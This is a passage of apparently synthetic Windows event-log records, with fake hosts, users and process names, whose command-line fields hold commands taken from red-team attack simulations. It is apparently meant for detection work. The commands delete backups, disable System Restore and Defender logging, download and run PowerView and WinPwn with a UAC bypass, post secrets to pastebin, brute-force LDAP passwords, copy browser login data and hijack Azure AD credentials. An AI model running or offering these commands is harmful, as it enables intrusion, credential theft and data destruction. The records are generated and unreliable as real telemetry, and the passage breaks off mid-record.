    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "srv-86.oconnor-weaver.biz",
        "User": "gregorysavage",
        "ProcessID": 3181,
        "ProcessName": "malware.exe",
        "CommandLine": "\"Start-Process #{MSP360_Connect_Path}\\n\",",
        "LogonID": 936228,
        "LogonGuid": "b80fe1f1-625f-49c5-b46e-6a208a49cbf5",
        "SourceProcessID": 3499,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Windows\\address..dll",
        "DestinationProcessID": 6396,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Windows\\sense..exe",
        "UtcTime": "2024-05-17T01:36:51.593978Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "db-65.hurst.com",
        "User": "reyeshaley",
        "ProcessID": 6221,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"Get-NetFirewallProfile | Format-Table Name, Enabled\\nGet-NetFirewallSetting\\nGet-NetFirewallRule | select DisplayName, Enabled, Description\\n\",",
        "LogonID": 334931,
        "LogonGuid": "6c785845-43e7-42b5-b8b9-3e08da6a8443",
        "SourceProcessID": 2853,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\others..exe",
        "DestinationProcessID": 6845,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Windows\\remember..dll",
        "UtcTime": "2024-05-17T01:36:51.593978Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "web-00.riddle.com",
        "User": "ronald32",
        "ProcessID": 3412,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"New-ItemProperty -Path \\\"HKLM:\\\\Software\\\\Microsoft\\\\Command Processor\\\" -Name \\\"AutoRun\\\" -Value \\\"#{command}\\\" -PropertyType \\\"String\\\"\",",
        "LogonID": 308403,
        "LogonGuid": "23c90360-7800-49ca-92fe-5eea056a49a1",
        "SourceProcessID": 1239,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Program Files\\people..exe",
        "DestinationProcessID": 4879,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Windows\\wide..exe",
        "UtcTime": "2024-05-17T01:36:51.593978Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "srv-79.parker.com",
        "User": "rebecca80",
        "ProcessID": 7281,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"del /s /f /q c:\\\\*.VHD c:\\\\*.bac c:\\\\*.bak c:\\\\*.wbcat c:\\\\*.bkf c:\\\\Backup*.* c:\\\\backup*.* c:\\\\*.set c:\\\\*.win c:\\\\*.dsk\\n\",",
        "LogonID": 785911,
        "LogonGuid": "4b9b0c3c-2d89-4010-aa3c-2e2948fa094b",
        "SourceProcessID": 5331,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Users\\Public\\name..dll",
        "DestinationProcessID": 1307,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Windows\\loss..dll",
        "UtcTime": "2024-05-17T01:36:51.593978Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "db-97.lee-sharp.org",
        "User": "uscott",
        "ProcessID": 4199,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"users\\nw\\nwho\\n\",",
        "LogonID": 379614,
        "LogonGuid": "2262dbeb-a07b-43a0-be50-60353a6107e2",
        "SourceProcessID": 8379,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Windows\\source..dll",
        "DestinationProcessID": 8423,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Program Files\\recent..exe",
        "UtcTime": "2024-05-17T01:36:51.594977Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "srv-75.mills.org",
        "User": "davismatthew",
        "ProcessID": 8123,
        "ProcessName": "malware.exe",
        "CommandLine": "\"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose\\n\",",
        "LogonID": 466809,
        "LogonGuid": "1852bff0-b924-4c8e-8e39-0a3f0ad9cacf",
        "SourceProcessID": 1968,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Program Files\\not..exe",
        "DestinationProcessID": 7110,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Program Files\\response..exe",
        "UtcTime": "2024-05-17T01:36:51.594977Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "email-35.harrington.info",
        "User": "brownaaron",
        "ProcessID": 3870,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"mkdir -p #{test_folder}\\ncd #{test_folder}; touch a b c d e f g\\nzip --password \\\"#{encryption_password}\\\" #{test_folder}/#{test_file} ./*\\necho \\\"#{encryption_password}\\\" | gpg --batch --yes --passphrase-fd 0 --output #{test_folder}/#{test_file}.zip.gpg -c #{test_folder}/#{test_file}.zip\\nls -l #{test_folder}\\n\",",
        "LogonID": 120965,
        "LogonGuid": "5c3cea31-0a65-4762-9796-943bb8fe5a29",
        "SourceProcessID": 3357,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Windows\\where..exe",
        "DestinationProcessID": 7062,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Users\\Public\\however..dll",
        "UtcTime": "2024-05-17T01:36:51.594977Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "srv-55.malone.com",
        "User": "cthompson",
        "ProcessID": 9013,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"echo \\\"\\\" | \\\"#{plink_file}\\\" \\\"#{vm_host}\\\" -ssh  -l \\\"#{vm_user}\\\" -pw \\\"#{vm_pass}\\\" -m \\\"#{cli_script}\\\"\\n\",",
        "LogonID": 597668,
        "LogonGuid": "d4191d6f-8df4-4baa-b0e6-d717f8727136",
        "SourceProcessID": 1842,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Users\\Public\\need..exe",
        "DestinationProcessID": 5994,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Users\\Public\\week..dll",
        "UtcTime": "2024-05-17T01:36:51.594977Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "lt-93.johnson.com",
        "User": "ashley23",
        "ProcessID": 8655,
        "ProcessName": "nc.exe",
        "CommandLine": "\"cmd.exe /c reg add HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f\\ncmd.exe /c reg add HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System /v EnableLinkedConnections /t REG_DWORD /d 1 /f\\ncmd.exe /c reg add HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\FileSystem /v LongPathsEnabled /t REG_DWORD /d 1 /f\\n\",",
        "LogonID": 575678,
        "LogonGuid": "e1d9b4e3-28eb-4307-a828-ceea3b941c9a",
        "SourceProcessID": 5034,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Windows\\paper..dll",
        "DestinationProcessID": 8936,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\property..dll",
        "UtcTime": "2024-05-17T01:36:51.594977Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "db-69.case-johnson.com",
        "User": "christopherjones",
        "ProcessID": 6855,
        "ProcessName": "nc.exe",
        "CommandLine": "\"Set-Location \\\"PathToAtomicsFolder\\\"\\n.\\\\T1572\\\\src\\\\T1572-doh-beacon.ps1 -DohServer #{doh_server} -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}\\n\",",
        "LogonID": 754599,
        "LogonGuid": "c0a0f1d6-1027-4907-8ada-951f53dd3c4f",
        "SourceProcessID": 3662,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Program Files\\network..dll",
        "DestinationProcessID": 5456,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\true..dll",
        "UtcTime": "2024-05-17T01:36:51.595980Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "web-43.henry.com",
        "User": "xware",
        "ProcessID": 6614,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"New-ItemProperty \\\"HKLM:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System\\\" -Name LocalAccountTokenFilterPolicy -PropertyType DWord -Value 1 -Force\\nNew-ItemProperty \\\"HKLM:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System\\\" -Name EnableLinkedConnections -PropertyType DWord -Value 1 -Force\\nNew-ItemProperty \\\"HKLM:\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\FileSystem\\\" -Name LongPathsEnabled -PropertyType DWord -Value 1 -Force\\n\",",
        "LogonID": 501324,
        "LogonGuid": "14a09a17-7415-4def-8b88-b33c0aaf73de",
        "SourceProcessID": 4706,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Program Files\\tax..dll",
        "DestinationProcessID": 8629,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Program Files\\organization..dll",
        "UtcTime": "2024-05-17T01:36:51.595980Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "desktop-29.houston-davis.biz",
        "User": "heatherphillips",
        "ProcessID": 5430,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"New-ItemProperty \\\"HKLM:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\WINEVT\\\\Channels\\\\Microsoft-Windows-Windows Defender/Operational\\\" -Name Enabled  -PropertyType DWord -Value 0 -Force\\n\",",
        "LogonID": 622697,
        "LogonGuid": "ecc75a97-9675-4801-a05c-8e04cd3fda92",
        "SourceProcessID": 3999,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Users\\Public\\until..exe",
        "DestinationProcessID": 6508,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\herself..exe",
        "UtcTime": "2024-05-17T01:36:51.595980Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "lt-43.hall.com",
        "User": "susansmith",
        "ProcessID": 4026,
        "ProcessName": "malware.exe",
        "CommandLine": "\"reg add \\\"HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows NT\\\\SystemRestore\\\" /v \\\"DisableConfig\\\" /t \\\"REG_DWORD\\\" /d \\\"1\\\" /f\\nreg add \\\"HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows NT\\\\SystemRestore\\\" /v \\\"DisableSR\\\" /t \\\"REG_DWORD\\\" /d \\\"1\\\" /f\\nreg add \\\"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\SystemRestore\\\" /v \\\"DisableConfig\\\" /t \\\"REG_DWORD\\\" /d \\\"1\\\" /f\\nreg add \\\"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\SystemRestore\\\" /v \\\"DisableSR\\\" /t \\\"REG_DWORD\\\" /d \\\"1\\\" /f\\n\",",
        "LogonID": 749355,
        "LogonGuid": "b46f8a7e-e859-484c-86c0-21ca407c2d2c",
        "SourceProcessID": 5529,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Users\\Public\\second..dll",
        "DestinationProcessID": 2988,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Users\\Public\\century..dll",
        "UtcTime": "2024-05-17T01:36:51.595980Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "lt-37.butler.com",
        "User": "richardsmith",
        "ProcessID": 3364,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"shutdown /l \\n\",",
        "LogonID": 843410,
        "LogonGuid": "815093af-216a-4639-8376-5cc2cc9763b8",
        "SourceProcessID": 8234,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Users\\Public\\night..dll",
        "DestinationProcessID": 1534,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Users\\Public\\chair..exe",
        "UtcTime": "2024-05-17T01:36:51.596978Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "email-82.newton-duncan.com",
        "User": "diazzachary",
        "ProcessID": 1991,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"$apiKey = \\\"#{api_key}\\\"\\n$content = \\\"secrets, api keys, passwords...\\\"\\n$url = \\\"https://pastebin.com/api/api_post.php\\\"\\n$postData = @{\\n  api_dev_key   = $apiKey\\n  api_option    = \\\"paste\\\"\\n  api_paste_code = $content\\n}\\n$response = Invoke-RestMethod -Uri $url -Method Post -Body $postData\\nWrite-Host \\\"Your paste URL: $response\\\"\\n\",",
        "LogonID": 828188,
        "LogonGuid": "5ed263da-24a1-45f2-bef8-d6a6d1f1beeb",
        "SourceProcessID": 3652,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Program Files\\what..dll",
        "DestinationProcessID": 3804,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Users\\Public\\team..exe",
        "UtcTime": "2024-05-17T01:36:51.596978Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "db-90.beck-perez.com",
        "User": "ohall",
        "ProcessID": 4173,
        "ProcessName": "malware.exe",
        "CommandLine": "\"Import-Module -Name AzureAD\\n$PWord = ConvertTo-SecureString -String \\\"#{password}\\\" -AsPlainText -Force\\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \\\"#{username}\\\", $Pword\\nConnect-AzureAD -Credential $Credential > $null\\n\\n$sp = Get-AzureADServicePrincipal -SearchString \\\"#{service_principal_name}\\\" | Select-Object -First 1\\nif ($sp -eq $null) { Write-Warning \\\"Service Principal not found\\\"; exit }\\n\\n# in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long\\n$credNotAfter = (Get-Date).AddDays(1)\\n$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry\\n\\n$cert = New-SelfSignedCertificate -DnsName \\\"atomicredteam.example.com\\\" -FriendlyName \\\"AtomicCert\\\" -CertStoreLocation Cert:\\\\CurrentUser\\\\My -KeyExportPolicy Exportable -Provider \\\"Microsoft Enhanced RSA and AES Cryptographic Provider\\\" -NotAfter $certNotAfter\\n$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())\\nWrite-Host \\\"Generated certificate \\\"\\\"$($cert.Thumbprint)\\\"\\\"\\\"\\n\\nNew-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \\\"AtomicTest\\\" -Usage Verify -Value $keyValue -EndDate $credNotAfter\\n\\nStart-Sleep -s 30\\n$tenant = Get-AzureADTenantDetail\\n$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $sp.AppId -CertificateThumbprint $cert.Thumbprint\\nWrite-Host \\\"Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\\\"\\nWrite-Host \\\"End of Hijacking\\\"\\n\",",
        "LogonID": 377510,
        "LogonGuid": "8d4e50a9-5c45-4d12-a919-9bcc31c33735",
        "SourceProcessID": 1002,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Windows\\activity..dll",
        "DestinationProcessID": 8157,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Windows\\money..exe",
        "UtcTime": "2024-05-17T01:36:51.596978Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "web-43.adams.com",
        "User": "wardlauren",
        "ProcessID": 6828,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"reg add \\\"HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\" /v HideSCANetwork /t REG_DWORD /d 1 /f\\n\",",
        "LogonID": 866631,
        "LogonGuid": "b999bcac-232f-4492-aac3-df900e477092",
        "SourceProcessID": 8901,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Windows\\strong..exe",
        "DestinationProcessID": 2179,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\career..exe",
        "UtcTime": "2024-05-17T01:36:51.596978Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "db-78.phillips.net",
        "User": "uharris",
        "ProcessID": 7144,
        "ProcessName": "malware.exe",
        "CommandLine": "\"security import #{cert_export} -k\\n\",",
        "LogonID": 191147,
        "LogonGuid": "439480b3-b42c-4a69-8dee-0be11d7ecf40",
        "SourceProcessID": 8233,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\director..dll",
        "DestinationProcessID": 6320,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\phone..exe",
        "UtcTime": "2024-05-17T01:36:51.597978Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "web-24.roach-scott.biz",
        "User": "mcleanchristopher",
        "ProcessID": 7381,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"if (\\\"#{auth}\\\".ToLower() -NotIn @(\\\"ntlm\\\",\\\"kerberos\\\")) {\\n  Write-Host \\\"Only 'NTLM' and 'Kerberos' auth methods are supported\\\"\\n  exit 1\\n}\\n\\n[System.Reflection.Assembly]::LoadWithPartialName(\\\"System.DirectoryServices.Protocols\\\") | Out-Null\\n$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(\\\"#{domain}\\\",389)\\n\\n$passwordList = Get-Content -Path \\\"#{passwords_path}\\\"\\nforeach ($password in $passwordList){\\n  $credz = new-object System.Net.NetworkCredential(\\\"#{user}\\\", $password, \\\"#{domain}\\\")\\n  $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::#{auth})\\n  try {\\n    Write-Host \\\" [-] Attempting ${password} on account #{user}.\\\"\\n    $conn.bind()\\n    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\\n    Write-Host \\\" [!] #{user}:${password} are valid credentials!\\\"\\n  } catch {\\n    Write-Host $_.Exception.Message\\n  }\\n}\\nWrite-Host \\\"End of bruteforce\\\"\\n\",",
        "LogonID": 967321,
        "LogonGuid": "6d97120a-a1bc-4b01-882a-ff7ee923902a",
        "SourceProcessID": 7287,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\day..exe",
        "DestinationProcessID": 7830,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\control..exe",
        "UtcTime": "2024-05-17T01:36:51.597978Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "email-25.murphy-smith.net",
        "User": "adavis",
        "ProcessID": 5939,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"(gwmi -list win32_shadowcopy).Create('#{drive_letter}','ClientAccessible')\\n\",",
        "LogonID": 908865,
        "LogonGuid": "38a0df44-6f3b-4a5a-b421-feba1ea56f99",
        "SourceProcessID": 7928,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Program Files\\enter..dll",
        "DestinationProcessID": 4151,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\ever..dll",
        "UtcTime": "2024-05-17T01:36:51.597978Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "email-91.wolf.com",
        "User": "qfrye",
        "ProcessID": 2369,
        "ProcessName": "nc.exe",
        "CommandLine": "\"Set-ItemProperty HKLM:\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\WinSock2\\\\Parameters -Name AutodialDLL -Value PathToAtomicsFolder\\\\T1546\\\\bin\\\\AltWinSock2DLL.dll\\n\",",
        "LogonID": 352637,
        "LogonGuid": "ed02b705-9558-4b5e-a741-8e616a6c480c",
        "SourceProcessID": 2039,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Windows\\challenge..exe",
        "DestinationProcessID": 3379,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Program Files\\think..exe",
        "UtcTime": "2024-05-17T01:36:51.597978Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "srv-31.chase-black.net",
        "User": "jhampton",
        "ProcessID": 7614,
        "ProcessName": "malware.exe",
        "CommandLine": "\"Import-Module \\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\PowerView.ps1\\\"\\nGet-NetDomainTrust\\nGet-NetForestTrust\\nGet-ADDomain\\nGet-ADGroupMember Administrators -Recursive\\n([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()\\n\",",
        "LogonID": 148581,
        "LogonGuid": "9d352ef5-7f82-438b-824a-d50e22b52148",
        "SourceProcessID": 6276,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Windows\\still..exe",
        "DestinationProcessID": 4266,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\weight..exe",
        "UtcTime": "2024-05-17T01:36:51.598976Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "lt-31.hardy.com",
        "User": "rangelsarah",
        "ProcessID": 9687,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"sudo sed -i \\\"#{index}s,^,#{pam_rule}\\\\n,g\\\" #{path_to_pam_conf}\\n\",",
        "LogonID": 811486,
        "LogonGuid": "078d5fce-d796-49f8-bedf-242c15bc9e02",
        "SourceProcessID": 5659,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Windows\\dark..dll",
        "DestinationProcessID": 2796,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Users\\Public\\minute..exe",
        "UtcTime": "2024-05-17T01:36:51.598976Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "srv-45.soto.com",
        "User": "melissamartin",
        "ProcessID": 8451,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"cscript \\\"#{vbscript}\\\" > $env:TEMP\\\\T1059.005.out.txt\\n\",",
        "LogonID": 774814,
        "LogonGuid": "a85bf927-63f9-481b-8e99-de060369b060",
        "SourceProcessID": 8110,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Program Files\\writer..dll",
        "DestinationProcessID": 1399,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Windows\\whatever..exe",
        "UtcTime": "2024-05-17T01:36:51.598976Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "srv-27.flores.com",
        "User": "stacykaufman",
        "ProcessID": 3799,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"Invoke-ATHCompiledHelp -SimulateUserDoubleClick -CHMFilePath #{chm_file_path}\",",
        "LogonID": 102503,
        "LogonGuid": "4b8563f2-f297-4025-a136-fe366c8f1cbe",
        "SourceProcessID": 2717,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\movement..exe",
        "DestinationProcessID": 8943,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\edge..exe",
        "UtcTime": "2024-05-17T01:36:51.598976Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "desktop-18.smith-ryan.info",
        "User": "sarah73",
        "ProcessID": 4650,
        "ProcessName": "nc.exe",
        "CommandLine": "\"esentutl.exe /y \\\"%LOCALAPPDATA%\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data\\\" /d \\\"#{output_path}\\\"\\n\",",
        "LogonID": 114695,
        "LogonGuid": "b527137e-a0c9-4e0b-ac47-8bcdd5ff62aa",
        "SourceProcessID": 9405,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Users\\Public\\center..dll",
        "DestinationProcessID": 9847,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\key..exe",
        "UtcTime": "2024-05-17T01:36:51.598976Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "srv-69.walker.com",
        "User": "mark76",
        "ProcessID": 9912,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\\nUACBypass -noninteractive -command \\\"C:\\\\windows\\\\system32\\\\cmd.exe\\\" -technique magic\",",
        "LogonID": 565520,
        "LogonGuid": "f04b8d3d-9157-4305-8e8d-136c8db98f1f",
        "SourceProcessID": 4708,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Program Files\\player..dll",
        "DestinationProcessID": 3686,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Windows\\capital..dll",
        "UtcTime": "2024-05-17T01:36:51.599983Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "lt-58.blackwell.com",
        "User": "brandongardner",
        "ProcessID": 9828,
        "ProcessName": "malware.exe",
        "CommandLine": "\"Get-Date\\n\",",
        "LogonID": 742747,
        "LogonGuid": "8264e913-9839-449d-b394-b47f27f88b9f",
        "SourceProcessID": 7434,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Program Files\\western..exe",
        "DestinationProcessID": 7085,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Users\\Public\\represent..exe",
        "UtcTime": "2024-05-17T01:36:51.599983Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "laptop-78.edwards.biz",
        "User": "aking",
        "ProcessID": 5536,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"$archive=\\\"$env:PUBLIC\\\\T1649\\\\atomic_certs.zip\\\"\\n$exfilpath=\\\"$env:PUBLIC\\\\T1649\\\\certs\\\"\\nAdd-Type -assembly \\\"system.io.compression.filesystem\\\"\\nRemove-Item $(split-path $exfilpath) -Recurse -Force -ErrorAction Ignore\\nmkdir $exfilpath | Out-Null\\nforeach ($cert in (gci Cert:\\\\CurrentUser\\\\My)) { Export-Certificate -Cert $cert -FilePath $exfilpath\\\\$($cert.FriendlyName).cer}\\n[io.compression.zipfile]::CreateFromDirectory($exfilpath, $archive)\\n\",",
        "LogonID": 540384,
        "LogonGuid": "68a5c089-f6b8-48b3-baad-7423d3b30533",
        "SourceProcessID": 3169,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Users\\Public\\study..dll",
        "DestinationProcessID": 8860,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\like..dll",
        "UtcTime": "2024-05-17T01:36:51.599983Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "srv-24.hernandez.com",
        "User": "jose62",
        "ProcessID": 9766,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"[ \\\"$(uname)\\\" = 'FreeBSD' ] && sysrc tor_enable=\\\"YES\\\" && service tor start || sudo systemctl start tor\\n\",",
        "LogonID": 109335,
        "LogonGuid": "e3844284-e1be-4145-836d-ce2f375a64eb",
        "SourceProcessID": 4360,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Program Files\\hundred..exe",
        "DestinationProcessID": 5254,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Windows\\down..exe",
        "UtcTime": "2024-05-17T01:36:51.599983Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "srv-54.brock-bailey.com",
        "User": "sandersjustin",
        "ProcessID": 2346,
        "ProcessName": "nc.exe",
        "CommandLine": "\"cmd /c \\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\nimgrab.exe\\\" #{remote_file} #{destination_path}\\n\",",
        "LogonID": 620420,
        "LogonGuid": "e3028ca2-1e07-458d-8aa5-d8654508cdbe",
        "SourceProcessID": 8969,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Users\\Public\\quality..exe",
        "DestinationProcessID": 1110,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Windows\\study..dll",
        "UtcTime": "2024-05-17T01:36:51.599983Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "srv-96.smith-hebert.com",
        "User": "aaronjames",
        "ProcessID": 2906,
        "ProcessName": "malware.exe",
